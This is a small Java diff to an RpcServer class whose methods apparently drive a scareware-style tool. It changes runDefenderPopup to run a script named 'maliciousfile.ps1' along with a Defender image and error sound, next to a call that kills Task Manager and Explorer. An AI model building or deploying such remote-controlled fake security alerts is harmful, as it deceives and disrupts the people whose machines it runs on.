@@ -72,9 +72,10 @@ public class RpcServer {
         methods1.runKillTaskmngrAndExp();
     }
 
+    ///  Has no handler
     public void runDefenderPopup() {
         RpcServerMethods methods = new RpcServerMethods();
-        methods.runScriptFromResources("maliciousfile.ps1");
+        methods.runScriptWithResources("maliciousfile.ps1", "defender.png", "winerror.wav");
     }
 
     private JsonNode handleInsertText(JsonNode req) {
